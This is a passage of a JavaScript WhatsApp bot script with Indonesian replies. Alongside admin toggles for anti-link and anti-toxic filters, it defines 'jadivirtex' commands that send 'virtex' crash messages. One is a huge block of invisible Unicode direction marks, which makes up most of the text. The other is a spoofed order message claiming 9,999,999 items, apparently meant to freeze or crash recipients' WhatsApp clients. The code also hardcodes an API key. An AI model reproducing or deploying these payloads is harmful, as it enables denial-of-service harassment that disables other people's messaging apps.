                   anu = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${F}&apikey=apivinz`)
                   kurzxd.sendMessage(from, anu, image, {caption: `Nih Ngabbbbbb `, quoted: kurz})
                   break
                   case 'antilink':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !kurz.key.fromMe && !isOwner) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (args.length < 1) return reply('ketik 1 untuk mengaktifkan\nketik 0 untuk menonaktifkan')
if (args[0] === "1") {
if (AntiLink) return reply('Sudah Aktif')
ntilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
reply(' Succes menyalakan antilink di group ini')
kurzxd.sendMessage(from, `PERINGATAN!!! jika bukan admin jangan send link di group ini`, text)
} else if (args[0] === "0") {
if (!AntiLink) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
reply(' Succes mematikan antilink di group ini')
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
case 'antitoxic':
					if (!isGroup) return reply('Kusus group')
					if (!isGroupAdmins) return reply('Kusus admin')
					if (!isBotGroupAdmins) return reply('Bot jadiin admin dlu')
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antitoxic 1`)
					if (Number(args[0]) === 1) {
						if (isToxic) return reply('Sudah Aktif kurz')
						antitoxic.push(from)
						fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic))
						reply('_Success mengaktifkan anti toxic digroup ini!_')
					} else if (Number(args[0]) === 0) {
						if (!isToxic) return reply('Sudah Mati ')
						var ini = antitoxic.indexOf(from)
						antitoxic.splice(ini, 1)
						fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic))
						reply('_Success mematikan anti toxic digroup ini!_')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break
  case 'jadivirtexv2':
   if (!q) return reply(`Teks?`)
   textt = `${q}                                                            ${q}@                                                                  
${jadivirtex1}
`
kurzxd.sendMessage(from, textt, text, {quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxd️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
break
case 'jadivirtex':
   if (!q) return reply(`Teks?`)
   textt = `${q}                                                            ${q}@                                                                  
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎